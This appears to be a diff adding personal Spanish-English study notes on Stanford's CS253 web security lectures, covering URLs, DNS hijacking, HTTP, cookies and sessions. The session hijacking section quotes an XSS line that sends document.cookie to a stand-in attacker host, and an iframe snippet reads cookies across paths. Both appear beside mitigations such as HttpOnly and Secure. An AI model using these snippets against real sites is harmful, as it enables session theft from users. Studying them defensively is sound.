@@ -1,0 +1,307 @@
+- Bash - Scripting
+	- Midulive: Hackearon a MongoDB y está en peligro
+		- https://www.youtube.com/watch?v=ECUFfB5iz2A
+		
+		- En minuto 12.16 indica que Feross tiene un excelente curso.
+		- https://web.stanford.edu/class/cs253/
+		- Feross: Web Security - Lecture 01 - What is Web Security? HTML & JavaScript Review
+			- https://www.youtube.com/watch?v=5JJrJGZ_LjM&list=PL1y1iaEtjSYiiSGVlL1cHsXN_kvJOOhu-
+			
+			- Buscar
+				- Vulnability vs exploid
+				- 
+				
+			- Ways to specify a URL (Uniform Resource Locators)
+				- Parts:
+					- Scheme
+						- http://
+					- Hostname
+						- example.com
+					- Port
+						- :81
+					- Path
+						- /a/b.html
+					- Query
+						- ?user=Alice&year=2019
+					- Fragment
+						- #p2
+				- Full URL
+					- <a href='http://stanford.edu/news/2019/'>2019 News </a>
+				- Relative URL
+					- <a href='september'>September News </a>
+						- Same as http://stanford.edu/news/2019/september
+				- Absolute URL
+					- <a href='/events'>Events</a>
+						- Same as http://stanford.edu/events
+				- Fragment URL
+					- <a href='#section3'>Jump to Section 3</a>
+						- Scrolls to <a name='section3' /> within page
+				
+			- Arumals: 101. USO DE CURL
+				- https://www.youtube.com/watch?v=vc5uWuKXvz4
+		
+			- Web Security - Lecture 02 - HTTP, Cookies, Sessions
+			
+		- Feross: Web Security - Lecture 02 - HTTP, Cookies, Sessions
+			- https://www.youtube.com/watch?v=zhnQFQ2qFtA&t=251s
+			
+			- What happens when you type a URL and press enter?
+				- Client asks DNS Recursive Resolver to lookup a hostname (standford.edu)
+				- DNS Recursive Resolver sends DNS query to Root Nameserver
+					- Root Nameserver resonds with IP address of TLD Nameserver (".edu" Nameserver)
+				- DNS Recursive Resolver sends DNS query to TLD Nameserver
+					- TLD Nameserver (Top-level domain) responds with IP address of Domain Nameserver ("standford.edu" Nameserver)
+				- DNS Recursive Resolver sends DNS query to Domain Nameserver
+					- Domain Nameserver is authoritative, so replies with server IP address
+				- DNS Recursive Resolver finally responds to Client, sending server IP address (171.62.215.200)
+				
+			- DNS + HTTP (attacks)
+				- Al consultar el Client por una IP address al DNS Recursive Resolver, en medio puede ser interseptado por el atacante y este responder un IP falso, lo que provoca que el Client se conecte a un sitio falso.
+				- 
+					- Defensa: TLS lo cual es básicamente encriptamiento, es cuando se ve HTTPS 
+						- Integridad: lo que significa que la respuesta no puede ser modificada y si lo es el cliente es capaz de decirlo.
+						- Autenticidad: asegura que el Client está hablando al server que pensamos que es. Esto se logra a través del uso de firmas.
+						
+			- DNS hijacking
+				- Attacker changes DNS records of target to pont to own IP Address 
+				- All site visitors are directed to attacker´s web server
+				- Motivation
+					- Phishing
+					- Revenue through ads, cryptocurrency mining, etc.
+				- How do they do it?
+					- 
+			- DNS hijacking vectors (11.00)
+				- Malware changes user´s local DNS settings
+				- Hacked recursive DNS resolver
+				- Hacked router
+				- Hacked DNS nameserver
+				- Compromised user account at DNS provider.
+				
+			- DNS privacy
+				- Queries are in plaintext
+				- ISPs have been known to sell this data
+				- Pro tip: Consider switching your DNS settings to Cloudflare (1.1.1.1) or another provider with a good privacy policy. 
+					- How to Change Your DNS Server on Windows 10 and Mac
+						- https://www.hellotech.com/guide/for/how-to-change-dns-server-windows-mac
+						- go to Settings > Network & Internet > Change Adapter Settings. Then right-click a connection and select Properties > IPv4 > Properties. Finally,select Use the following DNS server address.
+						
+					- Manuealmente
+						- https://www.youtube.com/watch?v=1MMnUBsUczY
+						- ipconfig /flushdns
+						- ipconfig /registerdns
+						- ipconfig /release
+						- ipconfig /renew
+						- NETSH winshock reset catalog
+						- NETSH int ip ipv4 reset reset.log
+						- NETSH int ipv6 reset reset.log 
+						- exit 
+				- OJO: aún cambiando a Cloudflare sigue el ISP pudiendo ver su actividad ya que es en texto plano, la solución sería DNS-over-HTTPS 
+					- https://blog.mozilla.org/futurereleases/2019/09/06/whats-next-in-making-dns-over-https-the-default/
+				
+			- 22.52 What happens when you type a URL and press enter?
+				- Demo: Make an HTTP request
+					- curl https://twitter.com
+					
+					- HTTP request 24.04
+						GET / HTTP/1.1
+						Host: twitter.com
+						User-Agent: Mozilla/5.0
+						
+						
+						GET    /    HTTP/1.1
+						Method Path Protocol Version
+						
+					- HTTP
+						- Client-server model - Client ask server for resource, server replies
+						- Simple - Human-readable text protocol
+						- Extensible - Just add HTTP headers
+						- Stateless - Two requeest have no relation on each other 
+						- Transport protocol agnostic - Only requirement is reliability 
+						
+			- Useful HTTP request headers 41.21
+				- Host
+				- User-Agent
+				- Referer
+				- Cookie 
+				- Range 
+				
+			- Demo: Make an HTTP request with headers 42.45
+				- curl https://twitter.com --header "Accept-Language: es"
+				- curl https://twitter.com --header "Accept-Language: es" --silent | grep JavaScript
+				
+			- HTTP response 44.13 
+				HTTP/1.1 200 OK
+				Content-Length: 9001
+				Content-Type: text/html; chrset=UTF-8
+				Date: Tue, 24 Sep 2019 20:30:00 GMT 
+				
+			- Useful HTTP response headers
+				- Date
+				- Last-Modified
+				- Cache-Control
+				- Expires
+				- Vary 
+				- Set-Cookie 
+				- Location
+				- Connection
+				- Content-Type 
+				- Content-Encoding
+				- Content-Language 
+				- Content-Lenght 
+				
+			- PROTOCOL STACK 47.33
+				- HTML CSS JS
+				- Hypertext Transfer Protocol(HTTP)
+				- Transport Layer Security(TLS) 
+				- Transmission Control Protocol(TCP)
+				- Internet Protocol(IP)
+				
+			- Demo: Implement and HTTP client 
+				- Not magic!
+				- Steps:
+					- Open a TCP socket
+					- Sent HTTP request text over the socket
+					- Read the HTTP response text from the socket.
+				
+			- DevTools 58.19
+				
+			- What happens when you type a URL and press enter? 59.48
+			
+				- Perform a DNS lookup on the hostname (example.com) to get an IP address (1.2.3.4)
+				- Open a TCP socket to 1.2.3.4. on port 80 (the HTTP port)
+				- Send an HTTP request that includes the desire path (/)
+				- Read the HTTP response from the socket
+				- Parse the HTML into the DOM 
+				- Render the page based on the DOM
+				- Repeat until all external resources are loaded:
+					- If there are pending external resources, make HTTP request for these (run steps 1-4)
+					- Render the resources into the page.
+					
+			- Cookies 1.02.00
+				- Server sets a cookie on the client 
+					- Set-Cookie: theme=dark;
+					
+					  Header Name Cookie Name Cookie Value
+					  
+				- Demos: Cookies 		
+				
+		- Feross: Web Security - Lecture 03 - Session Attacks
+			- https://www.youtube.com/watch?v=QuhgjXKzfI8&list=PL1y1iaEtjSYiiSGVlL1cHsXN_kvJOOhu-&index=3
+			
+			- Session
+				- El servidor quiere mantener algún conjunto de información acerca del usuario y ellos quieren hacer a lo largo de una serie de REQUEST (peticiones) necesitamos hacerlo usando cookies x q HTTP es stateless (sin estado), entonces necesitamos decirle al navegador recuerde estas llaves-valor. y que se lo envíe al servidor permitiéndole realizar lo q requiera. Con la sesión puede entregar las cookies cada vez que se contacte al servidor. 
+
+					
+			- Ambient authority 5.02
+				- Access control - Regulate who can view resources or take actions
+				- Ambient authority - Acces control bases on a global and persistent property of the requester
+					- The alternative is explicit authorization valid only for a specific action 
+				- There are four types of ambient authority on the web
+					- Cookies - most common, most versatile method
+					- IP checking - used at Stanford for library resources
+					- Build-in HTTP authentication - rarely used 
+					- Client certificates - rarely used.
+					
+			- Quick primer: Signature schemes 16.49
+				- Triple of algorithms (G, S, V)
+					- G: Generator
+					- S: Signer
+					- V: Verifier
+					
+					- G() -> (pk, sk) - generator returns public key and secret key
+						- Si llama G tiene dos valores, public key y secret key.
+					- S(sk, x) -> t - signing returns a tag t for input x. S es p
+						- S es la cosa que usted realmente usa para firmar un valor.
+						- firmar un valor significa X es algún valor randómico digamos una cadena de caracteres que la pasa en la clave secreta y pasa el valor que quiere firmar y obtiene algo llamado TAG, a TAG es otra cadena de caracteres randómica pero tiene algunas propiedades útiles asi si el usuario quiere probar que no ha habido algún tipo de cambio en este valor X cuando le envía al servidor puede probar con el TAG junto a él y esta función de verificación (V) que podemos usar 
+					- V(pk, x, t) -> accept|reject - checks validity of TAG t for given input x.
+						- Le pasamos la clave privada, el valor X que queremos verificar y el TAG relacionado.
+					
+				- Correctness property 18.22
+					- V(pk, x, S(sk, x)) = accept should always be true 
+				- Security property 19.07
+					- V(pk, x, t) = accept should almost never be true when x and t are  chosen by the attacker
+						- La idea es que si se crea una clase de TAG basura y tratar de pasarlo como un TAG verdadero casi nunca será verdadero.
+						
+				- Demo gráfica 20.45
+					- Client: Get /login HTTP/1.1
+							  username=alice&password=password
+					- Server: G() -> (pk, sk)
+						- Login info ok?
+						- Login OK: S(sk, 'alice') -> t
+						- HTTP/1.1 200 OK 
+						  Set-Cookie: username=alice;
+						  Set-Cookie: tag=t;
+						  
+					- Client hace alguna petición
+						- Get / HTTP/1.1
+						  Cookie: username=alice; tag=t
+						  
+					- Server: V(pk, 'alice', t) -> ok?
+						- HTTP/1.1 200 OK 
+						  Private wepage for Alice!
+					
+						
+						
+					
+			- Demo: Sessions 8.40 / 25.17
+				- Vamos a darle una cookie que nos aseguremos que su valor no puede ser modificado. 16.10
+				
+			- History of cookies 53.42
+			- Cookies attributes 56.11
+				- Expires: Specifies expiration date. If no date, then last for session 
+				- Path: Scope the "Cookie" header to a particular request path prefix.
+				- Domain: Allows the cookie to be scoped to a domain broader than the domain that returne the Set-Cookie header.
+			
+			- Accessing Cookies from JS
+				- Set
+					- document.cookie = 'name=Feross'
+					- document.cookie = 'favoriteFood=Cookies; Path=/'
+					
+				- Remove
+					- document.cookie = 'name=; Expires=Thu, 01 Jan 1970 00:00:00 GMT'
+					
+			- Session hijacking 1.03.36
+				- Enviar cookies sobre HTTP NO ENCRIPTADO es muy mala idea.
+					- Si todos pueden verla, ellos pueden usarla para "hijack (secuestrar)" la sesión de usuario.
+					- Atacantes envían las cookies de las víctimas como si fueran las propias.
+					- Servidor puede ser engañado.
+					
+				- Mitigación
+					- Usar cookie Secure.
+						- Set-Cookie: key=value; Secure 
+					- PERO MEJOR USAR HTTPS.	
+					
+			- Sesson hijacking via Cross Site Scripting (XSS)
+				- Qué pasa si el sitio web es vulnerable a XSS?
+					- Atacantes pueden insertar su código dentro de la página web.
+					- En este punto, ellos pueden fácilmente obtener el cookie de usuario. 
+					
+				- new Image().src = 'https://attaker.com/steal?cookie?=' + document.cookie
+				
+			- Protect cookies from XSS 1.09.54
+				- Use el atributo "HttpOnly" para prevenir que cookies sean leídas desde js.
+					- Set-Cookie: key=value; Secure; HttpOnly
+					
+			- Cookie Path bypass 1.11.20
+				- NO usar Path por seguridad
+				- Path no protege contra lecturas no autorizadas de la cookie desde un path diferente en el mismo origen (same origin)
+					- Puede ser bypassed usando un <iframe> con el path de la cookie.
+					- Y leer iframe.contentDocument.cookie 
+				- Esto es permitido por Same Origin Policy 
+				- Por lo tanto, solo usar Path para optimización de rendimiento.
+				
+				- DEMO 
+					- document.cookie = 'sessionId=1234'; Path=/class/cs106a'
+					
+					const iframe= document.createElemente('iframe')
+					iframe.src ='https://web.stanford.edu/class/cs106a/'
+					document.body.append(iframe)
+					iframe.style.display = 'none'
+					iframe.contentDocument.cookie 
+					
+					
+
+		- Feross: Web Security - Lecture 04 - Cross-Site Request Forgery, Same Origin Policy
+			- https://www.youtube.com/watch?v=0-q69vAYSwo&list=PL1y1iaEtjSYiiSGVlL1cHsXN_kvJOOhu-&index=4
+				
+				
